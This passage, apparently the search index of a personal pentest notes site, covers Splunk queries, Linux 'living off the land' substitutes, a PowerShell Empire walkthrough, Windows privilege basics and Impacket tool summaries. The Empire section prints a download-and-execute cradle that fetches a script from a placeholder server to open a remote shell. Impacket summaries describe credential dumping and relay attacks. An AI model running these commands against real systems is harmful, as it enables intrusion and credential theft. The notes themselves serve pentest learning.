Listener"},{"location":"Cheatsheets/General/msfvenom_cheatsheet/#references","text":"","title":"References"},{"location":"Cheatsheets/General/splunk_cheat_sheet/","text":"Splunk Cheatsheet Basics index=* - Show data from all indices index=\"name_of_index\" - Show data from specific index Operators \"fish\" AND \"chips\" \"fish\" or \"chips\" Sorting * | sort ip, -url - Sort results by ip value in ascending order and then by url value in descending order * | reverse - Reverse the order of a result set * | head 20 - Return the first 20 results * | tail 20 - Return the last 20 results (in reverse order) Splunk Official Wiki Cheatsheet","title":"Splunk Cheatsheet"},{"location":"Cheatsheets/General/splunk_cheat_sheet/#splunk-cheatsheet","text":"","title":"Splunk Cheatsheet"},{"location":"Cheatsheets/General/splunk_cheat_sheet/#basics","text":"index=* - Show data from all indices index=\"name_of_index\" - Show data from specific index","title":"Basics"},{"location":"Cheatsheets/General/splunk_cheat_sheet/#operators","text":"\"fish\" AND \"chips\" \"fish\" or \"chips\"","title":"Operators"},{"location":"Cheatsheets/General/splunk_cheat_sheet/#sorting","text":"* | sort ip, -url - Sort results by ip value in ascending order and then by url value in descending order * | reverse - Reverse the order of a result set * | head 20 - Return the first 20 results * | tail 20 - Return the last 20 results (in reverse order) Splunk Official Wiki Cheatsheet","title":"Sorting"},{"location":"Cheatsheets/Linux/2022-07-30-x-without-y/","text":"X Without Y (Living off the Land) Inspired by Staaldraad's Post on the Matter Run into situations like this quite often when testing container based systems so thought it was worth starting to compile them all into one document for reference purposes. ARP without ARP cat /proc/net/arp ip neigh Netstat without Netstat Staaldraad's AWK script: awk'function hextodec(str,ret,n,i,k,c){ ret = 0 n = length(str) for (i = 1; i <= n; i++) { c = tolower(substr(str, i, 1)) k = index(\"123456789abcdef\", c) ret = ret * 16 + k } return ret } function getIP(str,ret){ ret=hextodec(substr(str,index(str,\":\")-2,2)); for (i=5; i>0; i-=2) { ret = ret\".\"hextodec(substr(str,i,2)) } ret = ret\":\"hextodec(substr(str,index(str,\":\")+1,4)) return ret } NR > 1 \\{\\{if(NR==2)print \"Local - Remote\";local=getIP($2);remote=getIP($3)}{print local\" - \"remote}}' /proc/net/tcp Remove the backslashes before the if statement after NR > 1 to get it to work. The above presumes awk is installed, if it's not you're SOL. Ping without Ping Two cases for this. 1) We don't have ping 2) We do have ping but ICMP is blocked We can't get around Case #2 but we can get around Case #1. telnet ip.ad.dre.ss 80 nc -znv ip.ad.dre.ss port ls without ls echo * echo */* for i in *; do echo $i; done","title":"X Without Y (Living off the Land)"},{"location":"Cheatsheets/Linux/2022-07-30-x-without-y/#x-without-y-living-off-the-land","text":"Inspired by Staaldraad's Post on the Matter Run into situations like this quite often when testing container based systems so thought it was worth starting to compile them all into one document for reference purposes.","title":"X Without Y (Living off the Land)"},{"location":"Cheatsheets/Linux/2022-07-30-x-without-y/#arp-without-arp","text":"cat /proc/net/arp ip neigh","title":"ARP without ARP"},{"location":"Cheatsheets/Linux/2022-07-30-x-without-y/#netstat-without-netstat","text":"Staaldraad's AWK script: awk'function hextodec(str,ret,n,i,k,c){ ret = 0 n = length(str) for (i = 1; i <= n; i++) { c = tolower(substr(str, i, 1)) k = index(\"123456789abcdef\", c) ret = ret * 16 + k } return ret } function getIP(str,ret){ ret=hextodec(substr(str,index(str,\":\")-2,2)); for (i=5; i>0; i-=2) { ret = ret\".\"hextodec(substr(str,i,2)) } ret = ret\":\"hextodec(substr(str,index(str,\":\")+1,4)) return ret } NR > 1 \\{\\{if(NR==2)print \"Local - Remote\";local=getIP($2);remote=getIP($3)}{print local\" - \"remote}}' /proc/net/tcp Remove the backslashes before the if statement after NR > 1 to get it to work. The above presumes awk is installed, if it's not you're SOL.","title":"Netstat without Netstat"},{"location":"Cheatsheets/Linux/2022-07-30-x-without-y/#ping-without-ping","text":"Two cases for this. 1) We don't have ping 2) We do have ping but ICMP is blocked We can't get around Case #2 but we can get around Case #1. telnet ip.ad.dre.ss 80 nc -znv ip.ad.dre.ss port","title":"Ping without Ping"},{"location":"Cheatsheets/Linux/2022-07-30-x-without-y/#ls-without-ls","text":"echo * echo */* for i in *; do echo $i; done","title":"ls without ls"},{"location":"Cheatsheets/Linux/Powershell_Empire/","text":"Powershell Empire Started using this today, it's really cool. Takes a lot of the work out of finding scripts to run. Firing it up: /data/reset.sh Run it with that to reset the database, otherwise it seems to fail to start, not always though so if you just need to start it (and it doesn't crash) then do: ./empire Setup a Listener listeners Once you're inside that menu do: uselistener <tab-completion-works-here> View options with: info Then use set to configure the connection for your IP/Port: set Host 10.10.14.3:443 set Port 443 For the shell to come back the ports need to match (or so it appears) To start the listener: execute Then run: launcher powershell This will fire back the other half of the shell, which you can execute with IEX(New-Object Net.WebClient)downloadString('http://yoursever/yourfile.ps1') Interacting with Agents Head back to the main menu using back Now type agents to see a list of active agents. Get the name of the agent you wish to interact with, and type: interact <agent-name> (Empire) > interact ASWX9H8G (Empire: ASWX9H8G) > Now you can type: searchmodule <modulename (not case sensitive) Using Modules Once you've found the module you're looking for run: usemodule <module-name> Then type info and hit enter to see the options: (Empire: ASWX9H8G) > usemodule privesc/powerup/allchecks (Empire: powershell/privesc/powerup/allchecks) > info Name: Invoke-AllChecks Module: powershell/privesc/powerup/allchecks NeedsAdmin: False OpsecSafe: True Language: powershell MinLanguageVersion: 2 Background: True OutputExtension: None Authors: @harmj0y Description: Runs all current checks for Windows privesc vectors. Comments: https://github.com/PowerShellEmpire/PowerTools/tree/master/P owerUp Options: Name Required Value Description ---- -------- ------- ----------- Agent True ASWX9H8G Agent to run module on. In this case we can just type execute and then hit enter (Empire: powershell/privesc/powerup/allchecks) > execute [*] Tasked ASWX9H8G to run TASK_CMD_JOB [*] Agent ASWX9H8G tasked with task ID 4 [*] Tasked agent ASWX9H8G to run module powershell/privesc/powerup/allchecks (Empire: powershell/privesc/powerup/allchecks) > [*] Agent ASWX9H8G returned results. Job started: F9E4KY [*] Valid results returned by 10.10.10.81 Wait a few seconds. And that should output what it managed to find. Credentials creds add domain username password Use creds to see all stored credentials. For some modules you can then just use set CredID <ID number> and not have to type in the username and password. Getting Trolled By CredTypes If you see: [!] A CredID with a plaintext password must be used! Then check creds. If the password is the wrong type, readd it with the following: creds add DESKTOP-7I3S68E Administrator 3130438f31186fbaf962f407711faddb something plaintext Then just use the new ID and you gucci","title":"Powershell Empire"},{"location":"Cheatsheets/Linux/Powershell_Empire/#powershell-empire","text":"Started using this today, it's really cool. Takes a lot of the work out of finding scripts to run. Firing it up: /data/reset.sh Run it with that to reset the database, otherwise it seems to fail to start, not always though so if you just need to start it (and it doesn't crash) then do: ./empire Setup a Listener listeners Once you're inside that menu do: uselistener <tab-completion-works-here> View options with: info Then use set to configure the connection for your IP/Port: set Host 10.10.14.3:443 set Port 443 For the shell to come back the ports need to match (or so it appears) To start the listener: execute Then run: launcher powershell This will fire back the other half of the shell, which you can execute with IEX(New-Object Net.WebClient)downloadString('http://yoursever/yourfile.ps1') Interacting with Agents Head back to the main menu using back Now type agents to see a list of active agents. Get the name of the agent you wish to interact with, and type: interact <agent-name> (Empire) > interact ASWX9H8G (Empire: ASWX9H8G) > Now you can type: searchmodule <modulename (not case sensitive) Using Modules Once you've found the module you're looking for run: usemodule <module-name> Then type info and hit enter to see the options: (Empire: ASWX9H8G) > usemodule privesc/powerup/allchecks (Empire: powershell/privesc/powerup/allchecks) > info Name: Invoke-AllChecks Module: powershell/privesc/powerup/allchecks NeedsAdmin: False OpsecSafe: True Language: powershell MinLanguageVersion: 2 Background: True OutputExtension: None Authors: @harmj0y Description: Runs all current checks for Windows privesc vectors. Comments: https://github.com/PowerShellEmpire/PowerTools/tree/master/P owerUp Options: Name Required Value Description ---- -------- ------- ----------- Agent True ASWX9H8G Agent to run module on. In this case we can just type execute and then hit enter (Empire: powershell/privesc/powerup/allchecks) > execute [*] Tasked ASWX9H8G to run TASK_CMD_JOB [*] Agent ASWX9H8G tasked with task ID 4 [*] Tasked agent ASWX9H8G to run module powershell/privesc/powerup/allchecks (Empire: powershell/privesc/powerup/allchecks) > [*] Agent ASWX9H8G returned results. Job started: F9E4KY [*] Valid results returned by 10.10.10.81 Wait a few seconds. And that should output what it managed to find.","title":"Powershell Empire"},{"location":"Cheatsheets/Linux/Powershell_Empire/#credentials","text":"creds add domain username password Use creds to see all stored credentials. For some modules you can then just use set CredID <ID number> and not have to type in the username and password. Getting Trolled By CredTypes If you see: [!] A CredID with a plaintext password must be used! Then check creds. If the password is the wrong type, readd it with the following: creds add DESKTOP-7I3S68E Administrator 3130438f31186fbaf962f407711faddb something plaintext Then just use the new ID and you gucci","title":"Credentials"},{"location":"Cheatsheets/Linux/linux/","text":"Linux 101 #!/bin/bash my_variable=$1 echo $1 This is a test to see if the pipelines are still working.. (doesn't look like they are) Maybe it's fixed now?","title":"Linux 101"},{"location":"Cheatsheets/Linux/linux/#linux-101","text":"#!/bin/bash my_variable=$1 echo $1 This is a test to see if the pipelines are still working.. (doesn't look like they are) Maybe it's fixed now?","title":"Linux 101"},{"location":"Cheatsheets/Windows/101_windows/","text":"Windows Privilege Escalation 101 User Accounts These are the basic account(s) that you would use to log into a Windows machine. They are a collection of settings/preferences bound to a unique identity. i.e. the username and the files linked to that account along with other preferences such as installed applications and group membership(s), all the various things that could be associated with a user account. The local \"Administrator\" account is created by default during the installation process. It is not directly available to log in, similar to the root account on modern Linux systems, with the difference being that it can be activated using net user administrator /active:yes and it will become an account that appears on the login screen. Depending on the version of Windows that is running there may be several other default User accounts such as \"Guest\". Service Accounts Used to run services (duh), services are programs that are being ran either constantly (in the case of web servers and FTP applications) or on a scheduled basis by a dedicated account with permissions set up specifically for that account. So in the case of the NT AUTHORITY\\IUSR account which is used to control the IIS web service, it has specific permissions which allow it to manage the web server and all of it's associated functions. They cannot be used to log in to Windows directly. But they are capable of granting a \"user\" shell, which will allow for access to the system but with generally limited capabilites and permissions. The NT AUTHORITY\\SYSTEM account is a default service account created during installation which has the highest privileges of any local account on Windows. It is the Windows equivalent of the \"root\" account and has full control over any application or user account on the system. In some instances it will even be a trusted account on other machines in the same network allowing for lateral movement. There are other default service accounts that are created during the installation process, such as NETWORK SERVICE and LOCAL SERVICE, and the aforementioned IUSR. Groups User accounts can belong to multiple groups, and groups can have multiple users (same as Linux). Not much else to explain here, just bear in mind that there are LOTS of groups on Windows systems, and especially when it comes to AD/Domain controllers you're going to have to get your reference sheets out and run things like BloodHound to map all of the interactions between the groups. Groups allow for easier access control configuration by allowing multiple users the same level of access to a resource. We could created a group called \"Tech_Admins\" and give them access to restart/modify specific services and applications to allow them to perform maintenance or upgrades. There are two types of groups: Regular Groups These groups have a set list of members and are created by the domain or system Administrator(s), with the exception of the default groups such as \"Users\" which contain ALL regular (non-service) users of a system. Psuedo Groups These groups have a dynamic list of users that can change based on certain interactions, i.e. the \"Authenticated Users\" group contains a list of members who are CURRENTLY authenticated to the system. Resources Windows has a concept of resources known as Objects, there are multiple types of these: Files/Directories Registry Entries Services Everything is treated as an object and every object has a set of permissions attached to it. In most cases these are inherited from the parent directory but it is not allways the case and can lead to vulnerabilities we can take advantage of, and sometimes the inheritence itself is the thing we will look to take advantage of. Whether a user has permission to perform certain actions on a resource will depend on what Groups that User is a member of and what permissions the User has. whoami # computername\\username whoami /logonid # Gets the SID for our user whoami /priv # Permissions whoami /groups # Group Membership whoami /all # All the above at once ACLs & ACEs Permissions to access resources ( Objects ) in Windows are controlled by the ACLs or Access Control Lists for that resource. Each ACL is made up of zero or more access control entries (ACEs) Each ACE define the relationship between a Principal (the name Windows uses for Users and Groups) and a certain access right. To view the ACL for a particular Object you can use the GUI to open the Advanced Security Settings menu, or you can run the following command in PowerShell: Get-ACL <file> PS C:\\Users\\MrBullsec\\Documents> Get-Acl .\\notes_checklist.md Directory: C:\\Users\\MrBullsec\\Documents Path Owner Access ---- ----- ------ notes_checklist.md CC1\\MrBullsec NT AUTHORITY\\SYSTEM Allow FullControl... or the following in CMD.exe: icacls <file> PS C:\\Users\\MrBullsec\\Documents> icacls .\\notes_checklist.md .\\notes_checklist.md NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) CC1\\MrBullsec:(I)(F)","title":"Windows Privilege Escalation 101"},{"location":"Cheatsheets/Windows/101_windows/#windows-privilege-escalation-101","text":"","title":"Windows Privilege Escalation 101"},{"location":"Cheatsheets/Windows/101_windows/#user-accounts","text":"These are the basic account(s) that you would use to log into a Windows machine. They are a collection of settings/preferences bound to a unique identity. i.e. the username and the files linked to that account along with other preferences such as installed applications and group membership(s), all the various things that could be associated with a user account. The local \"Administrator\" account is created by default during the installation process. It is not directly available to log in, similar to the root account on modern Linux systems, with the difference being that it can be activated using net user administrator /active:yes and it will become an account that appears on the login screen. Depending on the version of Windows that is running there may be several other default User accounts such as \"Guest\".","title":"User Accounts"},{"location":"Cheatsheets/Windows/101_windows/#service-accounts","text":"Used to run services (duh), services are programs that are being ran either constantly (in the case of web servers and FTP applications) or on a scheduled basis by a dedicated account with permissions set up specifically for that account. So in the case of the NT AUTHORITY\\IUSR account which is used to control the IIS web service, it has specific permissions which allow it to manage the web server and all of it's associated functions. They cannot be used to log in to Windows directly. But they are capable of granting a \"user\" shell, which will allow for access to the system but with generally limited capabilites and permissions. The NT AUTHORITY\\SYSTEM account is a default service account created during installation which has the highest privileges of any local account on Windows. It is the Windows equivalent of the \"root\" account and has full control over any application or user account on the system. In some instances it will even be a trusted account on other machines in the same network allowing for lateral movement. There are other default service accounts that are created during the installation process, such as NETWORK SERVICE and LOCAL SERVICE, and the aforementioned IUSR.","title":"Service Accounts"},{"location":"Cheatsheets/Windows/101_windows/#groups","text":"User accounts can belong to multiple groups, and groups can have multiple users (same as Linux). Not much else to explain here, just bear in mind that there are LOTS of groups on Windows systems, and especially when it comes to AD/Domain controllers you're going to have to get your reference sheets out and run things like BloodHound to map all of the interactions between the groups. Groups allow for easier access control configuration by allowing multiple users the same level of access to a resource. We could created a group called \"Tech_Admins\" and give them access to restart/modify specific services and applications to allow them to perform maintenance or upgrades. There are two types of groups:","title":"Groups"},{"location":"Cheatsheets/Windows/101_windows/#regular-groups","text":"These groups have a set list of members and are created by the domain or system Administrator(s), with the exception of the default groups such as \"Users\" which contain ALL regular (non-service) users of a system.","title":"Regular Groups"},{"location":"Cheatsheets/Windows/101_windows/#psuedo-groups","text":"These groups have a dynamic list of users that can change based on certain interactions, i.e. the \"Authenticated Users\" group contains a list of members who are CURRENTLY authenticated to the system.","title":"Psuedo Groups"},{"location":"Cheatsheets/Windows/101_windows/#resources","text":"Windows has a concept of resources known as Objects, there are multiple types of these: Files/Directories Registry Entries Services Everything is treated as an object and every object has a set of permissions attached to it. In most cases these are inherited from the parent directory but it is not allways the case and can lead to vulnerabilities we can take advantage of, and sometimes the inheritence itself is the thing we will look to take advantage of. Whether a user has permission to perform certain actions on a resource will depend on what Groups that User is a member of and what permissions the User has. whoami # computername\\username whoami /logonid # Gets the SID for our user whoami /priv # Permissions whoami /groups # Group Membership whoami /all # All the above at once","title":"Resources"},{"location":"Cheatsheets/Windows/101_windows/#acls-aces","text":"Permissions to access resources ( Objects ) in Windows are controlled by the ACLs or Access Control Lists for that resource. Each ACL is made up of zero or more access control entries (ACEs) Each ACE define the relationship between a Principal (the name Windows uses for Users and Groups) and a certain access right. To view the ACL for a particular Object you can use the GUI to open the Advanced Security Settings menu, or you can run the following command in PowerShell: Get-ACL <file> PS C:\\Users\\MrBullsec\\Documents> Get-Acl .\\notes_checklist.md Directory: C:\\Users\\MrBullsec\\Documents Path Owner Access ---- ----- ------ notes_checklist.md CC1\\MrBullsec NT AUTHORITY\\SYSTEM Allow FullControl... or the following in CMD.exe: icacls <file> PS C:\\Users\\MrBullsec\\Documents> icacls .\\notes_checklist.md .\\notes_checklist.md NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) CC1\\MrBullsec:(I)(F)","title":"ACLs &amp; ACEs"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/","text":"Impacket Toolset Adapted from the Official Impacket Documentation Impacket is a whole collection of scripts and libraries written in Python :heart: that let you do some awesome things during a penetration test. The first part of this is a list of what I consider to be the most useful tools, and a brief description of how they can be used or how I've used them. The rest is from the official but I've made some formatting changes. Standout/Most Useful Tools smbserver.py - Does what it says on the tin. Gives you a quick and dirty SMB server that you can use for file transfers or for getting a service or user to authenticate against. GetUserSPNs.py - a.k.a Kerberoast. If you have a username/password combination for a user and Kerberos is open on the host then this is 100% worth a shot. If it's successful (i.e. there is Service Principal Name attached to account) the it'll return a Service Ticket which hopefully can be cracked a give you the password for whatever service account is attached. Any of the Remote Execution tools, but specifically psexec.py which is an awesome little tool for running remote commands on a target mimikatz.py - mini RPC server for mimikatz which drops you into a shell on the target that lets you run mimikatz commands There are LOADS more though, impacket is a whole collection of scripts. Here's some additional resources. https://tools.thehacker.recipes/impacket/examples/ How to Build a Home Lab Everything following this is from the official documentation aside from some formatting changes Protocols Ethernet, Linux \u201cCooked\u201d capture. IP, TCP, UDP, ICMP, IGMP, ARP. IPv4 and IPv6 Support. NMB and SMB1, SMB2 and SMB3 (high-level implementations). MSRPC version 5, over different transports: TCP, SMB/TCP, SMB/NetBIOS and HTTP. Plain, NTLM and Kerberos authentications, using password/hashes/tickets/keys. Portions/full implementation of the following MSRPC interfaces: EPM, DTYPES, LSAD, LSAT, NRPC, RRP, SAMR, SRVS, WKST, SCMR, DCOM, WMI Portions of TDS (MSSQL) and LDAP protocol implementations. Tools Remote Execution psexec.py : PSEXEC like functionality example using RemComSvc (https://github.com/kavika13/RemCom). smbexec.py : A similar approach to PSEXEC w/o using RemComSvc. The technique is described here. Our implementation goes one step further, instantiating a local smbserver to receive the output of the commands. This is useful in the situation where the target machine does NOT have a writeable share available. atexec.py : This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. wmiexec.py : A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy. dcomexec.py : A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects. Kerberos GetTGT.py : Given a password, hash or aesKey, this script will request a TGT and save it as ccache. GetST.py : Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user. GetPac.py : This script will get the PAC (Privilege Attribute Certificate) structure of the specified target user just having a normal authenticated user credentials. It does so by using a mix of [MS-SFU]\u2019s S4USelf + User to User Kerberos Authentication. GetUserSPNs.py : This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat. GetNPUsers.py : This example will attempt to list and get TGTs for those users that have the property \u2018Do not require Kerberos preauthentication\u2019 set (UF_DONT_REQUIRE_PREAUTH). Output is compatible with JtR. rbcd.py : Example script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer. ticketConverter.py : This script will convert kirbi files, commonly used by mimikatz, into ccache files used by Impacket, and vice versa. ticketer.py : This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC) allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the groups, ExtraSids, duration, etc. raiseChild.py : This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids. Windows Secrets secretsdump.py : Performs various techniques to dump secrets from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\\Temp directory) and read the rest of the data from there. For DIT files, we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state. mimikatz.py : Mini shell to control a remote mimikatz RPC server developed by @gentilkiwi. Server Tools/MiTM Attacks ntlmrelayx.py : This script performs NTLM Relay Attacks, setting an SMB, HTTP, WCF and RAW Server and relaying credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.). The script can be used with predefined attacks that can be triggered when a connection is relayed (e.g. create a user through LDAP) or can be executed in SOCKS mode. In this mode, for every connection relayed, it will be available to be used later on multiple times through a SOCKS proxy. karmaSMB.py : A SMB Server that answers specific file contents regardless of the SMB share and pathname specified. smbserver.py : A Python implementation of an SMB server. Allows to quickly set up shares and user accounts. WMI wmiquery.py : It allows to issue WQL queries and get description of WMI objects at the target system (e.g. select name from win32_account). wmipersist.py : This script creates/removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified. Known Vulnerabilities goldenPac.py : Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target. sambaPipe.py : This script will exploit CVE-2017-7494, uploading and executing the shared library specified by the user through the -so parameter. smbrelayx.py : Exploit for CVE-2015-0005 using a SMB Relay Attack. If the target system is enforcing signing and a machine account was provided, the module will try to gather the SMB session key through NETLOGON. SMB/MSRPC smbclient.py : A generic SMB client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination. It\u2019s an excellent example to see how to use impacket.smb in action. addcomputer.py : Allows to add a computer to a domain using LDAP or SAMR (SMB). getArch.py: This script will connect against a target (or list of targets) machine/s and gather the OS architecture type installed by (ab)using a documented MSRPC feature. exchanger.py : A tool for connecting to MS Exchange via RPC over HTTP v2. lookupsid.py : A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface, aiming at finding remote users/groups. netview.py : Gets a list of the sessions opened at the remote hosts and keep track of them looping over the hosts found and keeping track of who logged in/out from remote servers reg.py : Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. The idea is to provide similar functionality as the REG.EXE Windows utility. rpcdump.py : This script will dump the list of RPC endpoints and string bindings registered at the target. It will also try to match them with a list of well known endpoints. rpcmap.py : Scan for listening DCE/RPC interfaces. This binds to the MGMT interface and gets a list of interface UUIDs. If the MGMT interface is not available, it takes a list of interface UUIDs seen in the wild and tries to bind to each interface. samrdump.py : An application that communicates with the Security Account Manager Remote interface from the MSRPC suite. It lists system user accounts, available resource shares and other sensitive information exported through this service. services.py : This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC Interface. It supports start, stop, delete, status, config, list, create and change. smbpasswd.py : This script is an alternative to smbpasswd tool and intended to be used for changing expired passwords remotely over SMB (MSRPC-SAMR) MSSQL / TDS mssqlinstance.py : Retrieves the MSSQL instances names from the target host. mssqlclient.py : An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS. File Formats esentutl.py : An Extensibe Storage Engine format implementation. Allows dumping catalog, pages and tables of ESE databases (e.g. NTDS.dit) ntfs-read.py : NTFS format implementation. This script provides a mini shell for browsing and extracting an NTFS volume, including hidden/locked contents. registry-read.py : A Windwows Registry file format implementation. It allows to parse offline registry hives. Other findDelegation.py : Simple script to quickly list all delegation relationships (unconstrained, constrained, resource-based constrained) in an AD environment. GetADUsers.py : This script will gather data about the domain\u2019s users and their corresponding email addresses. It will also include some extra information about last logon and last password set attributes. Get-GPPPassword.py : This example extracts and decrypts Group Policy Preferences passwords using streams for treating files instead of mounting shares. Additionally, it can parse GPP XML files offline. mqtt_check.py : Simple MQTT example aimed at playing with different login options. Can be converted into a account/password brute forcer quite easily. rdp_check.py : [MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth. This example tests whether an account is valid on the target host. sniff.py : Simple packet sniffer that uses the pcapy library to listen for packets in # transit over the specified interface. sniffer.py : Simple packet sniffer that uses a raw socket to listen for packets in transit corresponding to the specified protocols. ping.py : Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. If the remote host is up, it should reply to the echo probe with an echo-reply packet. ping6.py : Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.","title":"Impacket Toolset"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#impacket-toolset","text":"Adapted from the Official Impacket Documentation Impacket is a whole collection of scripts and libraries written in Python :heart: that let you do some awesome things during a penetration test. The first part of this is a list of what I consider to be the most useful tools, and a brief description of how they can be used or how I've used them. The rest is from the official but I've made some formatting changes.","title":"Impacket Toolset"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#standoutmost-useful-tools","text":"smbserver.py - Does what it says on the tin. Gives you a quick and dirty SMB server that you can use for file transfers or for getting a service or user to authenticate against. GetUserSPNs.py - a.k.a Kerberoast. If you have a username/password combination for a user and Kerberos is open on the host then this is 100% worth a shot. If it's successful (i.e. there is Service Principal Name attached to account) the it'll return a Service Ticket which hopefully can be cracked a give you the password for whatever service account is attached. Any of the Remote Execution tools, but specifically psexec.py which is an awesome little tool for running remote commands on a target mimikatz.py - mini RPC server for mimikatz which drops you into a shell on the target that lets you run mimikatz commands There are LOADS more though, impacket is a whole collection of scripts. Here's some additional resources. https://tools.thehacker.recipes/impacket/examples/ How to Build a Home Lab Everything following this is from the official documentation aside from some formatting changes","title":"Standout/Most Useful Tools"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#protocols","text":"Ethernet, Linux \u201cCooked\u201d capture. IP, TCP, UDP, ICMP, IGMP, ARP. IPv4 and IPv6 Support. NMB and SMB1, SMB2 and SMB3 (high-level implementations). MSRPC version 5, over different transports: TCP, SMB/TCP, SMB/NetBIOS and HTTP. Plain, NTLM and Kerberos authentications, using password/hashes/tickets/keys. Portions/full implementation of the following MSRPC interfaces: EPM, DTYPES, LSAD, LSAT, NRPC, RRP, SAMR, SRVS, WKST, SCMR, DCOM, WMI Portions of TDS (MSSQL) and LDAP protocol implementations.","title":"Protocols"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#tools","text":"","title":"Tools"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#remote-execution","text":"psexec.py : PSEXEC like functionality example using RemComSvc (https://github.com/kavika13/RemCom). smbexec.py : A similar approach to PSEXEC w/o using RemComSvc. The technique is described here. Our implementation goes one step further, instantiating a local smbserver to receive the output of the commands. This is useful in the situation where the target machine does NOT have a writeable share available. atexec.py : This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. wmiexec.py : A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy. dcomexec.py : A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects.","title":"Remote Execution"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#kerberos","text":"GetTGT.py : Given a password, hash or aesKey, this script will request a TGT and save it as ccache. GetST.py : Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user. GetPac.py : This script will get the PAC (Privilege Attribute Certificate) structure of the specified target user just having a normal authenticated user credentials. It does so by using a mix of [MS-SFU]\u2019s S4USelf + User to User Kerberos Authentication. GetUserSPNs.py : This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat. GetNPUsers.py : This example will attempt to list and get TGTs for those users that have the property \u2018Do not require Kerberos preauthentication\u2019 set (UF_DONT_REQUIRE_PREAUTH). Output is compatible with JtR. rbcd.py : Example script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer. ticketConverter.py : This script will convert kirbi files, commonly used by mimikatz, into ccache files used by Impacket, and vice versa. ticketer.py : This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC) allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the groups, ExtraSids, duration, etc. raiseChild.py : This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids. Windows Secrets secretsdump.py : Performs various techniques to dump secrets from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\\Temp directory) and read the rest of the data from there. For DIT files, we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state. mimikatz.py : Mini shell to control a remote mimikatz RPC server developed by @gentilkiwi.","title":"Kerberos"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#server-toolsmitm-attacks","text":"ntlmrelayx.py : This script performs NTLM Relay Attacks, setting an SMB, HTTP, WCF and RAW Server and relaying credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.). The script can be used with predefined attacks that can be triggered when a connection is relayed (e.g. create a user through LDAP) or can be executed in SOCKS mode. In this mode, for every connection relayed, it will be available to be used later on multiple times through a SOCKS proxy. karmaSMB.py : A SMB Server that answers specific file contents regardless of the SMB share and pathname specified. smbserver.py : A Python implementation of an SMB server. Allows to quickly set up shares and user accounts.","title":"Server Tools/MiTM Attacks"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#wmi","text":"wmiquery.py : It allows to issue WQL queries and get description of WMI objects at the target system (e.g. select name from win32_account). wmipersist.py : This script creates/removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified.","title":"WMI"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#known-vulnerabilities","text":"goldenPac.py : Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target. sambaPipe.py : This script will exploit CVE-2017-7494, uploading and executing the shared library specified by the user through the -so parameter. smbrelayx.py : Exploit for CVE-2015-0005 using a SMB Relay Attack. If the target system is enforcing signing and a machine account was provided, the module will try to gather the SMB session key through NETLOGON.","title":"Known 